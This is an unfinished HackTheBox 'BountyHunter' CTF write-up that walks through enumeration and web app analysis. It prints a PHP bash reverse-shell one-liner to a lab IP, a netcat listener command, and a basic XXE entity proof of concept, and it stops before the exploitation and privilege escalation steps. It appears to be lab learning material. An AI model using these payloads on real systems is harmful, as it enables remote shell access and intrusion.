---
title: "BountyHunter"
author: "Me"
date: "October 20, 2021"
output: html_document
---

# BountyHunter

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: easy (?/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_bounty_desc.png){: height="415px" width = 625px"}
</div>

**Ports/services exploited:** ?\\
**Tools:** ?\\
**Techniques:** ?\\
**Keywords:** ? 


## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

Let's enumerate the running services with *nmap*. We'll use the flags *-sV* to have a verbose output, *-O* to enable OS detection, and *-sC* to enable the most common scripts scan:

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_bounty_nmap.png)
</div>

Very straightforward start, only an http server running on port 80 and ssh on port 22. This latter appears to be OpenSSH 8.2p1, and I know from experience that it is not vulnerable. Let's focus on the web server.

## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

As usual, the first thing to do is browse to the target's IP and look at the content:

<div class="img_container">
![web server]({{https://jsom1.github.io/}}/_images/htb_bounty_site.png)
</div>

We land on a cool looking site where we see a few potential useful information. For example, we see "can use burp": since this is a CTF, it might be a hint to use Burp to intercept traffic between our machine and the server.\\
There are also 3 tabs: *about* is just an anchor, but *Contact us* and *Portal* bring us to pages with forms where we can submit data. For example, this is the *Portal* page:

<div class="img_container">
![Portal]({{https://jsom1.github.io/}}/_images/htb_bounty_portal.png)
</div>

While looking around the website, we can lanch *dirb* to look for interesting directories. The result is the following:

<div class="img_container">
![dirb]({{https://jsom1.github.io/}}/_images/htb_bounty_dirb.png)
</div>

There are two accessible directories, *asseets* and *resources*. By looking at their content (by simply browsing to *10.10.11.100/resources*), we see a promising *README* file:

<div class="img_container">
![readme]({{https://jsom1.github.io/}}/_images/htb_bounty_readme.png)
</div>

What immediately stands out here is of course the fact that there is a *test* account on the portal that hasn't been disabled. Moreover, it seems we can connect without providing a password.\\
We also learn the existence of a *tracker submit* script and that this latter isn't connected to the database. Finally, developer group permissions have been fixed: that probably means we'll have to escalate our privileges once we have a foothold, but that's why we're here :).

Let's just try to interact with the portal. We cannot submit credentials (*test* with no password), but we can see what it does:

<div class="img_container">
![test portal]({{https://jsom1.github.io/}}/_images/htb_bounty_test.png)
</div>

We see the database isn't ready (probably because the input here is handled by the *tracket submit* script, which isn't connected to the database yet), but we also understand what it does: it simply adds bounty information in an underlying database.\\
Since there are no direct interactions with the DB, we can exclude the possibility of SQL injections for now and will have to find something else.

Still in */ressources*, there's a JavaScript script called *bountylog.js*:

<div class="img_container">
![url]({{https://jsom1.github.io/}}/_images/htb_bounty_url.png)
</div>

We first see a function called *returnSecret()* which takes data as an argument and then does a POST request to *10.10.11.100/tracker_diRbPr00f314.php*. Below this function, there is another one that crafts an xml message from the fields we can fill on *10.10.11.100/log_submit.php*, and uses the *returnSecret()* function (*btoa* converts from binary to ASCII*). This gives us a good understandding of the application. However, we would need to see the content of the *tracker_diRbPr00f314.php* script to get the full picture...

After playing a while with the reporting system (*/log_submit.php*), I saw that there is nothing displayed when we input "<" in any field... Every other input seems to work:

<div class="img_container">
![no output]({{https://jsom1.github.io/}}/_images/htb_bounty_nop.png)
</div>

However, a simple "<" returns no output. It looks like it's not properly sanitized... I thought about trying a simple one-liner PHP reverse shell as follows, but it didn't work:

<div class="img_container">
![php]({{https://jsom1.github.io/}}/_images/htb_bounty_php.png)
</div>

The complete command is the following:

````
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/4444 0>&1'");
`````

And in the case that would work, we set up a netcat listener on port 4444 as follows: *sudo nc -nlvp 4444*.
After submitting this, we can inspect the network tab and we see it was Base64 encoded. We can check on any decoding tool:

<div class="img_container">
![decode]({{https://jsom1.github.io/}}/_images/htb_bounty_decode.png)
</div>

However, we receive nothing on our listener. At this point, I had to ask for help... It turns out we should have known, based on the XML output wee see on the previous image, that it might be vulnerable to **XXE injection**. I don't know about that, so let's have a look on the internet (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md):\\
"*An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.*"\\
Well, that sounds promising. There are 2 types of XML Entity:

- XML Internal Entity: If an entity is declared within a DTD it is called as internal entity. Syntax: <!ENTITY entity_name "entity_value">
- XML External Entity: If an entity is declared outside a DTD it is called as external entity. Identified by SYSTEM.Syntax: <!ENTITY entity_name SYSTEM "entity_value">

The webpage also shows how to detect the vulnerability. Here's the PoC:

````
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
`````

This is a basic entity test: when the XML parser parses the external entities the result should contain "John" in firstName and "Doe" in lastName. Entities are defined inside the DOCTYPE element. It might help to set the Content-Type: application/xml in the request when sending XML payload to the server.

Let's try this. We'll use Burp to intercept a request, send it to the repeater and modify it to match the PoC:






## 3. Privilege escalation
{:style="color:DarkRed; font-size: 170%;"}


<ins>**My thoughts**</ins>


